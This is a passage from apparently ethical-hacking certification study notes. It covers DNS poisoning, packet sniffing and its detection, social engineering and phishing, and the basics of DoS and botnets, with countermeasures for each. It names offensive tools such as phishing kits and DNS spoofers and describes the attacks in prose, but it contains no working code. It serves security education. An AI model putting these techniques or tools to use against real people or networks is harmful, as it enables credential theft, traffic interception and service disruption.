				- Network Segmentation : Reduce the scope of STP attacks by dividing larger broadcast domains into smaller, more manageable segments.
		- DNS Poisoning:
			- DNS is a protocol that translates domain names (e.g., www.eccouncil.org) into IP addresses (e.g., 208.66.172.56). It uses DNS tables, which store domain names and their corresponding IP addresses in a distributed database.
			- DNS poisoning, also known as DNS spoofing, occurs when an attacker deceives a DNS server into accepting false information as legitimate. This allows the attacker to redirect victims to a malicious server instead of the intended one.
			- The attacker achieves this by manipulating DNS table entries, substituting a legitimate IP address with a fraudulent one at the DNS level, where domain names are resolved into numeric IP addresses. They may also create fake DNS entries for the malicious server, using domain names identical to the target server.
			- As a result, the victim unknowingly connects to the attacker’s server. Once the connection is established, the attacker can compromise the victim’s system, steal sensitive data, or perform further malicious actions.
			- DNS Poisoning Techniques:
				- Intranet DNS Spoofing
					- An attacker can perform an intranet DNS spoofing attack on a switched LAN using the ARP poisoning technique. To execute this attack, the attacker must be connected to the LAN and able to sniff network traffic or packets. By intercepting the DNS request ID from the intranet, the attacker can send a malicious reply to the sender faster than the legitimate DNS server, redirecting the victim to a malicious destination.
					- The attacker uses tools like arpspoof or dnsspoof to poison the router and redirect DNS requests from clients to the attacker’s machine. When a client sends a DNS request to the router, the compromised router forwards the request to the attacker’s machine. The attacker then responds with a fake DNS reply, redirecting the client to a fraudulent website controlled by the attacker.
					- On this fake website, the attacker can capture all information submitted by the client, such as passwords or other sensitive data. After extracting the required information, the attacker may redirect the client to the legitimate website to avoid suspicion.
				- Internet DNS Spoofing:
					- Internet DNS poisoning, also known as remote DNS poisoning, allows attackers to perform DNS spoofing attacks on one or multiple victims worldwide. To execute this attack, the attacker sets up a rogue DNS server with a static IP address. The attack is often facilitated using Trojans that modify the victim’s DNS settings when their system connects to the internet.
					- This attack, a form of a Man-in-the-Middle (MITM) attack, involves the attacker altering the victim’s primary DNS entries, replacing the legitimate DNS server's IP address with a fake IP address that resolves to the attacker’s system. As a result, the victim’s traffic is redirected to the attacker’s system, enabling the attacker to intercept and steal confidential information.
				- Proxy Server DNS Poisoning:
					- In the proxy server DNS poisoning technique, the attacker sets up a proxy server on their system and configures it with a fraudulent DNS, making its IP address the primary DNS entry. Using a Trojan, the attacker alters the victim's proxy server settings to route traffic through the malicious proxy.
					- The proxy server acts as the primary DNS, redirecting the victim’s traffic to a fake website controlled by the attacker. There, the attacker can intercept and steal confidential information. After capturing the data, the attacker may forward the request to the legitimate website to avoid suspicion.
				- DNS Cache Poisoning:
					- DNS cache poisoning involves altering or adding forged DNS records in a DNS resolver’s cache to redirect DNS queries to malicious sites. The DNS system uses cache memory to store recently resolved domain names and their corresponding IP addresses, enabling faster responses by avoiding repeated lookups.
					- In this attack, the attacker populates the DNS cache with forged entries, including domain names and fake IP addresses. When a user sends a request, the resolver checks its cache. If the requested domain is found, the resolver quickly returns the cached entry, reducing traffic and response time.
					- Attackers exploit this mechanism by injecting false entries into the cache. If the DNS resolver cannot verify that a response came from an authoritative source, it caches the incorrect entries locally and serves them to users making the same request. As a result, the resolver replaces the legitimate IP address with a fake one. When users request the poisoned domain, the resolver directs them to the attacker’s malicious server instead of the intended one.
					- SAD DNS Attack:
						- SAD DNS is a modern variant of DNS cache poisoning, where attackers inject malicious DNS records into a DNS cache to redirect traffic to their own servers. This technique allows attackers to deceive client browsers, leading them to fake websites containing malicious content instead of legitimate ones.
						- Attackers exploit side channels, vulnerabilities in DNS resolvers like dnsmasq, unbound, and BIND on newer operating systems, and outdated DNS software used for resolving queries to carry out SAD DNS attacks.
			- DNS Poisoning Tools:
				- DerpNSpoof : DerpNSpoof is a DNS poisoning tool used to spoof DNS query packets for a specific IP address or a group of hosts within a network. Attackers can use this tool to create a list of fake DNS records and load it during execution to redirect victims to malicious or unintended websites.
				- dnsspoof : dnsspoof is a DNS spoofing tool that intercepts DNS responses from a router and replaces them with forged DNS responses.
				- arpspoof : arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.
				- deserter (github.com)
				- PolarDNS (github.com)
				- Ettercap (www.ettercap-project.org)
				- Evilgrade (github.com)
				- DNS Goisoner (github.com)
			- Defend Against DNS Spoofing:
				- Implement Domain Name System Security Extensions (DNSSEC) to authenticate DNS responses.
				- Use Secure Socket Layer (SSL) to encrypt and secure traffic.
				- Resolve all DNS queries through a local DNS server.
				- Block DNS requests to external servers to prevent unauthorized lookups.
				- Configure firewalls to restrict external DNS lookups.
				- Enable DNS NXDOMAIN rate limiting to mitigate exploitation attempts.
				- Use static ARP and IP tables for added protection.
				- Prevent outgoing traffic from using UDP port 53 as the default source port.
				- Regularly audit DNS servers to identify and remove vulnerabilities.
				- Deploy sniffing detection tools to monitor for suspicious activity.
				- Restrict DNS zone transfers to a limited set of trusted IP addresses.
				- Reduce the timeout period for outstanding queries to mitigate SAD DNS attacks.
				- Keep DNS servers updated with the latest patches to prevent security breaches.
				- Disable the “Hosts” file resolution on both clients and servers.
				- Use DNS resolvers with security features like DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) to encrypt DNS queries and prevent manipulation.
				- Configure Access Control Lists (ACLs) on DNS servers to accept queries only from trusted sources.
	- Sniffing Tools:
		- Wireshark:
			- Wireshark enables the capture and interactive analysis of network traffic on a computer network. It uses WinPcap to capture packets on supported networks. Wireshark can monitor live network traffic across various types of networks, including Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI. The captured files can also be programmatically edited through the command line. Additionally, a robust set of display filters allows for customized data presentation and refined analysis.
			- Follow TCP Stream in Wireshark:
				- Wireshark’s "Follow TCP Stream" feature displays TCP port data as seen at the application layer. It can identify passwords in Telnet sessions or interpret data streams. To use it, select a TCP packet and navigate to Analyze ➔ Follow ➔ TCP Stream. Wireshark applies a display filter and shows stream content in sequence, with formats like ASCII, hex, or raw.
				- Attackers may exploit network traffic to capture credentials and monitor user activity, extracting sensitive information.
			- Display Filters in Wireshark:
				- Wireshark includes display filters that filter network traffic based on criteria such as protocol type, IP address, or port. Display filters adjust the view of packets in captured files. To apply a filter, enter a protocol name (e.g., ARP, HTTP, TCP, UDP, DNS, or IP) in Wireshark's filter box. Multiple filters can be used simultaneously for more refined analysis.
				- Display filters:
					- Filtering by Protocol: arp, http, tcp, udp, dns, and ip
					- Monitoring Specific Ports: tcp.port == 23
					- Filtering by Multiple IP Addresses: ip.addr == 10.0.0.4 or ip.addr == 10.0.0.5
					- Filtering by IP Address: ip.addr == 10.0.0.4
		- Capsa Portable Network Analyzer:
			- Capsa, a portable network performance analysis and diagnostics tool, offers packet capture and analysis through an intuitive interface. It enables users to monitor and secure networks in critical business environments.
			- However, attackers can also exploit this tool to sniff packets from a target network and identify vulnerabilities.
		- OmniPeek:
			- OmniPeek Network Analyzer offers real-time visibility and expert analysis across all parts of a target network. It helps analyze, troubleshoot, and resolve performance bottlenecks across multiple network segments. Analytic plug-ins enhance OmniPeek's capabilities, providing advanced visualization and search functionality.
			- The Google Maps plug-in further extends its utility by displaying the locations of public IP addresses from captured packets directly within the OmniPeek capture window.
			- Attackers could misuse OmniPeek to monitor and analyze network traffic in real time, identify the source locations of traffic, extract sensitive information, and exploit network vulnerabilities.
		- RITA (Real Intelligence Threat Analytics) (github.com)
		- Observer Analyzer (www.viavisolutions.com)
		- PRTG Network Monitor (www.paessler.com)
		- Network Performance Monitor (www.solarwinds.com)
		- Xplico (www.xplico.org)
	- Defend Against Sniffing:
		- Countermeasures to Defend Against Sniffing:
			- Restrict physical access to network media to prevent the installation of packet sniffers.
			- Use end-to-end encryption to protect confidential information.
			- Permanently add the MAC address of the gateway to the ARP cache.
			- Use static IP addresses and ARP tables to prevent attackers from adding spoofed ARP entries to the network.
			- Disable network identification broadcasts and restrict the network to authorized users to prevent discovery via sniffing tools.
			- Use IPv6 instead of IPv4, as IPsec is optional in IPv4 but mandatory in IPv6.
			- Employ switches instead of hubs, as switches deliver data only to the intended recipient.
			- Utilize security tools such as PGP, S/MIME, VPNs, IPSec, SSL/TLS, SSH, and one-time passwords (OTPs).
			- Use SNMPv3 instead of SNMPv1 or SNMPv2 for managing networked devices.
			- Encrypt wireless traffic using strong protocols such as WPA2 or WPA3.
			- Retrieve MAC addresses directly from NICs to prevent MAC address spoofing.
			- Use tools to detect NICs operating in promiscuous mode.
			- Avoid broadcasting session set identifiers (SSIDs).
			- Implement a MAC filtering mechanism on routers.
			- Deploy network scanning and monitoring tools to detect malicious intrusions, rogue devices, and sniffers.
			- Avoid accessing unsecured or open Wi-Fi networks.
			- Use VLANs and network segmentation to divide the network into smaller, secure segments, limiting the scope for sniffers.
			- Regularly monitor and audit network traffic for unusual patterns indicative of sniffing activities.
		- Detect Sniffing:
			- Detecting a sniffer is difficult as it only captures data in promiscuous mode, without transmitting any traffic. Promiscuous mode allows a network device to intercept all packets, bypassing destination address validation. To detect sniffers, check for systems in promiscuous mode. Standalone sniffers are hard to detect, but reverse DNS lookup can help identify non-standalone sniffers.
			- Sniffer Detection Methods:
				- Ping Method:
					- To detect a sniffer on a network, identify systems running in promiscuous mode. The ping method can help identify systems in promiscuous mode, which in turn can reveal sniffers installed on the network.
					- Send a ping request to the suspected machine using its IP address and an incorrect MAC address. The Ethernet adapter will reject the packet because the MAC address does not match. However, a machine running a sniffer will respond, as it does not reject packets with a different MAC address. This response can help identify the sniffer on the network.
				- DNS Method:
					- The reverse DNS lookup is the opposite of the standard DNS lookup method. Sniffers that perform reverse DNS lookups can increase network traffic, which may indicate their presence. This increased traffic suggests that computers on the network are in promiscuous mode.
					- Reverse DNS lookups can be performed remotely or locally. To detect them, monitor the organization’s DNS server for incoming reverse DNS lookups. Another method is to send ICMP requests to a non-existing IP address. The machine performing the reverse DNS lookup will respond to the ping, thus identifying it as hosting a sniffer.
					- For local reverse DNS lookups, configure the detector in promiscuous mode. Send an ICMP request to a non-existing IP address and check the response. If the system responds, it indicates that the machine is performing reverse DNS lookups locally. A machine generating reverse DNS lookup traffic is likely running a sniffer.
				- ARP Method:
					- This technique sends a non-broadcast ARP request to all nodes on the network. The node running in promiscuous mode will cache the local ARP address and then broadcast a ping message using the local IP address but a different MAC address. Only the node with the cached MAC address will respond to the broadcast ping request.
					- A machine in promiscuous mode will reply to the ping message because it has the correct information about the host in its cache, while other machines will send an ARP probe to identify the source of the ping request. This process helps detect the node where the sniffer is running.
			- Promiscuous Detection Tools:
				- Nmap:
					- Nmap’s NSE (Nmap Scripting Engine) script allows checking whether a system on a local Ethernet network has its network card in promiscuous mode.
					- Detect NIC in Promiscuous Mode: nmap --script=sniffer-detect <ip/range>
				- NetScanTools Pro:
					- NetScanTools Pro includes the Promiscuous Mode Scanner tool to scan the subnet for network interfaces listening to all Ethernet packets in promiscuous mode. Security professionals use NetScanTools Pro to scan the subnet with modified ARP packets and identify devices responding to each type of ARP packet.


--------------------------------------------------

# Social Engineering

- Social engineering is the art of manipulating and convincing individuals to disclose confidential information. Social engineers exploit the fact that people are often unaware of the value of the information they possess and may be careless about safeguarding it. By using social engineering tactics, attackers can deceive individuals and exploit human vulnerabilities to gain access to sensitive information, authorizations, and credentials.
- Before conducting a social engineering attack, the attacker collects information about the target organization from various sources:
	- The organization’s official websites, where details such as employee IDs, names, and email addresses may be publicly available.
	- Advertisements published through media, which may reveal information about the organization’s products, services, and offers.
	- Blogs, forums, and other online platforms where employees might share personal or organizational details.
- Once sufficient information has been gathered, the attacker carries out social engineering attacks using techniques such as impersonation, piggybacking, tailgating, reverse social engineering, and other methods.
- Types of Social Engineering:
	- Human-based Social engineering:
		- Impersonation: The attacker pretends to be a legitimate or authorized individual. This impersonation can be carried out in person or through communication channels such as phone, email, or other mediums. By impersonating someone trustworthy, attackers can deceive their targets into disclosing sensitive information.
		- Vishing: Vishing (voice or VoIP phishing) is an impersonation technique used in electronic fraud, where the attacker manipulates individuals into revealing personal and financial information through voice technology, such as telephone systems or VoIP. The attacker often employs caller ID spoofing to forge identification.
		- Eavesdropping: The unauthorized listening to conversations or reading of messages. It involves intercepting audio, video, or written communications through channels such as telephone lines, email, instant messaging, and other forms of communication.
		- Shoulder Surfing: A direct observation technique involving watching over someone's shoulder to obtain sensitive information, such as passwords, PINs, or account numbers. This can also be carried out from a distance using vision-enhancing tools such as binoculars.
		- Dumpster Diving: The act of searching through someone else’s trash to find valuable information. This technique involves retrieving items such as phone bills, contact details, financial records, operational documents, or other sensitive information from a target company’s trash bins, printer bins, or user desks (e.g., sticky notes).
		- Reverse Social Engineering: The attacker poses as an authority figure, prompting the target to seek their advice. During this process, the target may willingly provide the information the attacker is attempting to obtain.
		- Piggybacking: An unauthorized individual gains access to a secure area by being intentionally or unintentionally allowed entry by an authorized person. For example, the unauthorized person might say, “I forgot my ID badge at home. Please help me.”
		- Tailgating: The attacker, often wearing a fake ID badge, gains access to a secured area by closely following an authorized person through a door that requires key access.
		- Diversion Theft: The attacker deceives a delivery person into rerouting a genuine consignment to a location other than the intended destination.
		- Honey Trap: Attackers target an individual within a company by pretending to be an attractive person online. They initiate a fake online relationship to extract confidential information about the target company. In some cases, attackers lure end users with enticing offers in exchange for critical information such as login credentials and other sensitive data.
		- Baiting: A physical device, such as a USB flash drive containing malicious files, is strategically placed in a location where it can be easily found, enticing individuals to pick it up and use it.
		- Bait and Switching: Bait and switching is a social engineering technique where the attacker captures the victim's attention by presenting an enticing offer through a clickable link or file download. The victim, lured by the offer, clicks the link or downloads the file, at which point the attacker executes their malicious goals—such as installing malware, stealing sensitive information, or compromising the victim’s security.
		- Quid Pro Quo: Attackers call multiple random numbers within a company, pretending to be from technical support. They offer assistance or services to end users in exchange for confidential data, such as login credentials or other sensitive information.
		- Elicitation: Attackers extract information from the victim by engaging them in casual, non-threatening conversations. By understanding the victim’s interests, attackers tailor their approach to elicit the relevant information without raising suspicion.
	- Computer-based Social Engineering:
		- Phishing:
			- Phishing is the practice of sending fraudulent emails that appear to be from legitimate sources, with the goal of acquiring a user’s personal or account information. Phishing emails or pop-ups often redirect users to counterfeit webpages that mimic trusted sites, where they are prompted to submit sensitive personal information.
			- Types of Phishing:
				- Spear Phishing: A targeted phishing attack directed at specific individuals or groups within an organization. Attackers craft messages with personalized, socially engineered content to deceive their targets and steal sensitive information.
				- Whaling: An attacker targets high-profile individuals, such as CEOs, CFOs, politicians, or celebrities, who have access to confidential and highly valuable information. Through email or website spoofing, the attacker deceives the victim into revealing critical corporate or personal data.
				- Pharming:
					- Pharming is a social engineering technique where the attacker executes malicious programs on a victim’s computer or server. When the victim enters a URL or domain name, their traffic is automatically redirected to an attacker-controlled website. This type of attack is also referred to as “Phishing without a Lure.” The attacker uses this method to steal sensitive information such as credentials, banking details, and other data related to web-based services.
					- DNS Cache Poisoning:
						- In a DNS cache poisoning attack, the attacker targets a DNS server and modifies the IP address associated with a legitimate website (e.g., www.targetwebsite.com) to redirect to a malicious website (e.g., www.hackerwebsite.com).
						- When the victim enters the legitimate website’s URL in the browser's address bar, the browser sends a request to the DNS server to obtain the IP address of the target website. However, the DNS server, already compromised by the attacker, returns the fake IP address.
						- As a result, the victim is redirected to the attacker-controlled fake website, where sensitive information may be stolen or malicious actions performed.
					- Host File Modification:
						- In a host file modification attack, the attacker sends malicious code to the victim, often as an email attachment. When the victim clicks on the attachment, the code executes and alters the local host file on the user’s computer.
						- Once the host file is compromised, any attempt by the victim to access a legitimate website by entering its URL in the browser’s address bar results in automatic redirection to a fraudulent website controlled by the attacker.
						- Pharming attacks can also be carried out using malware, such as Trojan horses or worms, which modify host files or other system settings to achieve the same malicious outcome.
				- Spimming: A variant of spam that exploits instant messaging platforms to flood networks with spam messages. Attackers use bots to harvest instant messaging IDs and spread malicious or unwanted content across the platform.
				- Clone Phishing: An attacker creates a nearly identical copy of a legitimate email or communication. This clone includes a malicious link or attachment, often replacing elements from the original message to point to a harmful destination.
				- E-wallet Phishing: Attackers target electronic wallet users by sending phishing emails or messages, pretending to be a legitimate e-wallet provider to steal sensitive financial information.
				- Tabnabbing and Reverse Tabnabbing:
					- Tabnabbing: A malicious webpage tricks users by altering its content to resemble a familiar site (e.g., a bank login page) when the user switches back to the tab, capturing their credentials.
					- Reverse Tabnabbing: A seemingly legitimate website deceives users into opening a malicious link, which then changes the content of the original tab into a phishing site.
				- Consent Phishing: Attackers exploit the OAuth authentication protocol used by web services. They create a fake, legitimate-looking application or website and lure victims to it, tricking them into granting access to sensitive information.
				- Search Engine Phishing: Attackers manipulate search engine results to lead users to fraudulent websites designed to steal sensitive information or distribute malware. This is achieved through techniques like search engine optimization (SEO) manipulation, keyword stuffing, and other methods to ensure the malicious websites rank highly in search results.
			- Phishing Tools:
				- ShellPhish : ShellPhish is a phishing tool used to phish user credentials from various social networking platforms such as Instagram, Facebook, Twitter, and LinkedIn. It also displays the victim system’s public IP address, browser information, hostname, geolocation, and other information.
				- Social-Engineer Toolkit (SET) : The Social-Engineer Toolkit (SET) is an open-source, Python-driven tool designed for penetration testing through social engineering. It is a versatile framework built to execute advanced attacks against human targets, aiming to extract sensitive information. SET categorizes its attacks based on the attack vector, such as email, web, and USB attacks. The toolkit exploits human vulnerabilities, such as trust, fear, greed, and the innate helpfulness of individuals, to achieve its objectives.
				- Dark-Phish (github.com)
				- BLACKEYE (github.com)
				- SocialFish (github.com)
				- Modlishka (github.com)
				- Trape (github.com)
				- Gophish (getgophish.com)
				- King Phisher (github.com)
				- LUCY SECURITY (lucysecurity.com)
				- Zphisher (github.com)
		- Spam Mail : Spam consists of irrelevant, unwanted, and unsolicited emails designed to gather sensitive financial information, such as Social Security numbers or bank details. Attackers send spam messages to lure victims into sharing confidential data or to distribute email attachments containing malicious software like viruses or Trojans. Social engineers often disguise the file extensions of these attachments with long filenames to deceive the recipient.
		- Instant Chat Messenger : In this technique, an attacker engages in conversations with selected online users through instant messaging platforms. They aim to gather personal information, such as dates of birth or maiden names, which can then be used to crack user accounts or exploit other vulnerabilities.
		- Pop-up Window Attacks : Pop-ups are used to trick or compel users into clicking on hyperlinks that redirect them to fake web pages. These pages may request personal information or download malicious programs such as keyloggers, Trojans, or spyware. A common tactic to entice users is by displaying a warning about a problem, such as a realistic operating system or application error message, or by offering additional services.
		- Scareware : Scareware is a type of malware that tricks users into visiting malware-infested websites, downloading malicious software, or purchasing potentially harmful programs. It often appears in the form of pop-ups that claim the user’s machine is infected with malware. These pop-ups are designed to look like legitimate alerts from reputable antivirus companies. They create a sense of urgency, prompting the victim to quickly download the suggested software to remove the supposed virus.
		- Hoax Letters : A hoax letter is a message that warns recipients of a non-existent computer virus threat. It relies on social engineering to spread widely. While hoaxes do not usually cause physical damage or data loss, they waste time, reduce productivity, and consume valuable organizational network resources.
		- Chain Letters : A chain letter is a message that promises free gifts, such as money or software, on the condition that the recipient forwards the email to a predetermined number of people. These messages often use emotionally compelling stories, “get-rich-quick” pyramid schemes, spiritual beliefs, or superstitious threats of bad luck if the recipient fails to pass the message along. Chain letters also rely heavily on social engineering tactics to propagate.
		- Create Deepfake Videos:
			- Attackers create deepfake videos of a target individual by utilizing previously recorded audio and video samples. These samples may include narratives of deceased persons, stolen online account clippings, or clips associated with unknown identities. By cloning and manipulating these clips, attackers generate highly convincing fake videos. The goal of such deepfake attempts is to deceive online users into believing they are viewing authentic content. These videos can be used for malicious purposes, such as impersonation, spreading misinformation, or committing fraud.
			- Deepfake Video Creation Tools:
				- DeepFaceLab (www.deepfakevfx.com)
				- Vidnoz (www.vidnoz.com)
				- Deepfakesweb (deepfakesweb.com)
				- Synthesia (www.synthesia.io)
				- DeepBrain AI (www.deepbrain.io)
				- Hoodem (hoodem.com)
		- Voice Cloning:
			- Voice cloning using AI involves the use of sophisticated machine learning algorithms to create highly convincing imitations of an individual's voice. These attacks exploit techniques such as speech synthesis and neural network-based models to accurately replicate the unique characteristics of a person.
			- Voice Cloning Tools:
				- VEED.IO (www.veed.io)
				- Murf.AI (murf.ai)
				- Resemble.AI (www.resemble.ai)
				- ElevenLabs (elevenlabs.io)
				- PlayHT (play.ht)
				- voice.ai (voice.ai)
		- Perform Impersonation on Social Networking Sites:
			- Malicious users collect confidential information from social networking sites and create accounts using another person’s name. These attackers use fraudulent profiles to build extensive networks of friends and extract sensitive information by employing various social engineering techniques.
		- Identity Theft:
			- Identity theft is a crime where an imposter steals personally identifiable information, such as a person’s name, credit card number, Social Security number, or driver’s license number, to commit fraud or other crimes. Attackers may also use identity theft to impersonate employees of a target organization and gain physical access to restricted facilities.
	- Mobile-based Social Engineering:
		- Publishing Malicious Apps:
			- An attacker creates a malicious application, such as a gaming app with appealing features, and publishes it on major application stores under a popular or misleading name. Unsuspecting users download the application, believing it to be legitimate.
			- Once installed, the app infects the device with malware, which collects and transmits sensitive information, such as usernames, passwords, contact details, and other personal data, to the attacker.
		- Repackaging Legitimate Apps:
			- Malware can sometimes be hidden within legitimate apps. Platform vendors provide centralized marketplaces where users can conveniently browse and install games and applications. Developers typically submit their apps to these marketplaces.
			- However, a malicious developer may download a legitimate app, repackage it with malware, and upload it to a third-party application store. When an unsuspecting user downloads the repackaged app, the malicious program infects the device, collects sensitive user information, and sends it to the attacker.
		- Using Fake Security Applications:
			- In this attack, the attacker begins by infecting the victim’s computer with malicious software. They then upload a fraudulent application to an app store. When the victim logs into their bank account, the malware displays a pop-up message instructing them to download a security application on their phone to receive an important message. Believing the pop-up to be legitimate, the victim downloads the application from the attacker’s app store.
			- Once the application is installed, the attacker gains access to confidential information, such as the victim's bank account login credentials (username and password). When the bank sends a second authentication code to the victim via SMS, the attacker intercepts and uses this information to gain unauthorized access to the victim’s bank account.
		- SMiShing (SMS Phishing):
			- SMiShing, or SMS phishing, is the act of using SMS text messaging on cellular phones or other mobile devices to deceive users into taking immediate action. This may include downloading malware, visiting a malicious webpage, or calling a fraudulent phone number. SMiShing messages are carefully crafted to prompt an urgent response from the victim, often tricking them into revealing personal information, account credentials, or financial details.
		- QRLJacking:
			- QRLJacking is a social engineering attack that exploits the QR code login mechanism used in various web applications to hijack login sessions and gain unauthorized access to victims' accounts. This method allows attackers to take full control of the compromised accounts and steal sensitive data.
			- Additionally, during the login process, attackers can obtain further details, such as the victim’s current GPS location, device ID, IMEI, and SIM card information. These details enable malicious activities, including unauthorized transactions, impersonation, and sending spam messages.
			- Cloning the QR code captured from a legitimate website is a critical step in a QRLJacking attack. Attackers can use tools like QR TIGER to clone a legitimate QR code and modify it for malicious purposes.
			- QR Code Cloning Tools:
				- QR TIGER:
					- QR TIGER is a QR code generator tool that enables attackers to create duplicate copies of legitimate QR codes. It can clone both static and dynamic QR codes, and generate multiple duplicates stored in a folder.
					- Additionally, QR TIGER allows attackers to track information from dynamic QR codes, such as the number of scans, the time and location of scans, and the type of device used for scanning. This tracking capability can assist in monitoring and targeting specific users, making it a powerful tool for malicious activities.
				- QR Code Generator (support.qr-code-generator.com)
				- Soti MobiControl (www.soti.net)
				- QR Code KIT (qrcodekit.com)
- Social Engineering Countermeasures:
	- Good policies and procedures are ineffective if they are not properly taught and reinforced with employees.
	- After receiving training, employees should sign a statement acknowledging that they understand and will follow the policies.
	- The main objectives of social engineering defense strategies are to raise user awareness, implement robust internal network controls, and establish secure policies, plans, and processes.
	- Official Security Policies and Procedures
		- Password Policies
		- Physical Security Policies
		- Social Engineering Campaigns
		- Gap Analysis
		- Remediation Strategies
		- Training on Security Policies
		- Implementation of Proper Access Privileges
		- Background Checks and Proper Termination Processes
	- Anti-Phishing Toolbar:
		- Netcraft (www.netcraft.com):
			- The Netcraft anti-phishing community operates like a vast neighborhood watch, empowering its most vigilant and skilled members to protect everyone within the community from phishing attacks. The Netcraft Toolbar provides real-time updates about the sites users visit and blocks dangerous websites.
			- It also offers detailed information about popular websites, helping users make informed decisions regarding the integrity of those sites. As shown in the screenshot, Netcraft effectively protects individuals and organizations from phishing attacks and fraud.
		- PhishTank (phishtank.com):
			- PhishTank is a collaborative clearing house for data and information related to phishing on the internet. It offers an open API that developers and researchers can use to integrate anti-phishing data into their applications. Security professionals can use PhishTank to verify whether a URL is a phishing site or not.
		- Scanurl (scanurl.net)
		- Isitphishing (isitphishing.org)
		- Threatcop (threatcop.ai)
		- e.Veritas (www.emailveritas.com)
		- Virustotal (www.virustotal.com)
	- Audit Organization's Security for Phishing Attacks using OhPhish:
		- The primary objective of conducting phishing campaigns against employees of a client organization is to assess their vulnerability to phishing attacks. This helps the organization identify potential risks and reduce the likelihood of employees falling victim to phishing attempts by cyber threat actors.
		- OhPhish (portal.ohphish.com):
			- OhPhish is a web-based portal designed to test employees’ susceptibility to social engineering attacks. It serves as a phishing simulation tool that allows organizations to run phishing simulation campaigns targeting their employees. The platform captures responses and generates Management Information System (MIS) reports and trends in real-time, which can be tracked by user, department, or designation.
			- OhPhish can be utilized to audit an organization’s security against phishing attacks, using various phishing methods such as Entice to Click, Credential Harvesting, Send Attachment, Training, Vishing, and Smishing.


--------------------------------------------------

# Denial-of-Service

- A Denial-of-Service (DoS) attack is an attempt to disrupt the normal functioning of a computer system or network by reducing, restricting, or completely preventing legitimate users from accessing system resources. During a DoS attack, the attacker floods the victim’s system with illegitimate service requests or traffic, overloading its resources and causing the system to crash or perform poorly. This often results in the victim’s website becoming unavailable or its system/network performance being significantly degraded. The primary objective of a DoS attack is to deny access to legitimate users, rather than to gain unauthorized access or corrupt data.
- DoS attacks typically target either network bandwidth or system connectivity:
	- Bandwidth Attacks: These attacks overwhelm the network by generating an excessive volume of traffic, consuming available network resources and preventing legitimate users from accessing them.
	- Connectivity Attacks: These attacks bombard a system with a massive number of connection requests, exhausting the operating system’s resources and preventing it from processing legitimate user requests.
- Impacts of DoS Attacks:
	- Resource Consumption: Depleting critical system resources, such as memory, CPU time, or data structures
	- Bandwidth Overload: Consuming network bandwidth, disk space, or other essential resources
	- Physical Damage: Damaging or altering network components
	- Data Destruction: Corrupting or deleting programming and files within the affected system
- Examples of DoS Attack Types:
	- Flooding the victim’s system with more traffic than it can handle
	- Overloading a service (e.g., Internet Relay Chat (IRC)) with more events than it can process
	- Crashing a TCP/IP stack by sending corrupted packets
	- Disrupting a service by interacting with it in an unexpected or malicious manner
	- Causing a system to hang by forcing it into an infinite loop
- Distributed Denial-of-Service:
	- A Distributed Denial-of-Service (DDoS) attack is a large-scale, coordinated form of a Denial-of-Service (DoS) attack that targets the availability of a victim’s system or network resources. It is carried out indirectly through numerous compromised computers, often referred to as botnets, distributed across the Internet.
	- By leveraging client/server technology, the attacker can significantly amplify the impact of the attack by utilizing the resources of multiple unwitting accomplice computers, which act as platforms for the assault. The overwhelming flood of incoming messages or traffic to the target system forces it to shut down or become unresponsive, effectively denying service to legitimate users.
	- The main goal of a DDoS attack is to compromise multiple systems and use them to overwhelm a victim’s resources. Attackers identify vulnerable systems using custom scripts, gain access, and install DDoS software.
	- The attack is initiated by sending commands to zombie agents—compromised computers controlled via a command-and-control (C&C) server. These agents send spoofed connection requests to reflector systems, impersonating the victim’s IP address. The reflectors then flood the victim with responses, overwhelming its system. This traffic overload reduces performance or causes the system to shut down.
	- Botnets:
		- A botnet (short for “robot network”) is a large network of compromised systems that are “infected” with bots (also known as zombies). Attackers use these bots to form a botnet, enabling them to launch DDoS attacks, generate spam, spread malware, and commit other cybercrimes.
		- Bots are software applications that automate tasks over the Internet. They can be used maliciously to exploit system vulnerabilities, perform illegal activities, or run hidden programs to identify weaknesses. Botnets act as agents controlled by intruders to carry out such activities.
		- However, not all bots are malicious. They are also used for benign purposes, such as data collection, web crawling, or data mining. For example, bots may coordinate DoS attacks or assist in “web spidering.” There are various types of bots, including Internet bots, IRC bots, and chatterbots. Examples of IRC bots include Cardinal, Sopel, Eggdrop, and EnergyMech.
		- Botnets can be used by attackers to perform the following activities:
			- Launch DDoS attacks to overwhelm systems.
			- Generate spam emails on a massive scale.
			- Sniff network traffic to intercept sensitive data.
			- Perform keylogging to capture user input, such as passwords.
			- Spread new malware across systems.
			- Install unwanted advertisement add-ons on victim devices.
			- Exploit Google AdSense for fraudulent revenue.
			- Attack IRC chat networks to disrupt communication.
			- Manipulate online polls and games to skew results.
			- Commit mass identity theft by harvesting personal information.
			- Perform credential stuffing attacks using stolen login credentials.
			- Conduct cryptocurrency mining using victim system resources.
		- Scanning Methods for Finding Vulnerable Machines:
			- Random Scanning: Infected machines randomly probe IP addresses in a target network to find vulnerabilities. Once a machine is compromised, malicious code is installed. This method generates high traffic and slows as uninfected IPs decrease.
			- Hit-List Scanning: Attackers compile a list of vulnerable machines and scan for targets. Once a machine is infected, the list is divided, and the new host continues scanning. This approach rapidly infects machines.
			- Topological Scanning: Infected machines use information (e.g., URLs) from their systems to locate and compromise new targets. This method is precise and efficient.
			- Local Subnet Scanning: Infected machines target vulnerable systems within their local network, often bypassing firewalls. It’s often combined with other techniques.
			- Permutation Scanning: Attackers share a pseudorandom list of IPs. Scanning starts from a random point and skips infected machines. Scanning stops after repeated encounters with infected hosts, then restarts with a new key.
		- How Malicious Code Propagates:
			- Central Source Propagation: The attacker stores the attack toolkit on a central server. When a vulnerable machine is found, the central source transfers a copy of the toolkit to the compromised system, where it is installed automatically using scripting mechanisms. The infected system then searches for other vulnerable machines to repeat the process. Common protocols used include HTTP, FTP, and RPC.
			- Back-chaining Propagation: The attacker keeps the attack toolkit on their own system. When a vulnerable machine is discovered, the attacker’s machine establishes a connection to the compromised system and transfers the toolkit. Tools such as port listeners or intruder-installed web servers use the Trivial File Transfer Protocol (TFTP) for back-channel file transfer.
			- Autonomous Propagation: In this method, the attacking host directly transfers the attack toolkit to the vulnerable system at the moment it breaches it, without relying on an external file source.
- Categories of DoS/DDoS Attack Vectors:
	- Volumetric Attacks:
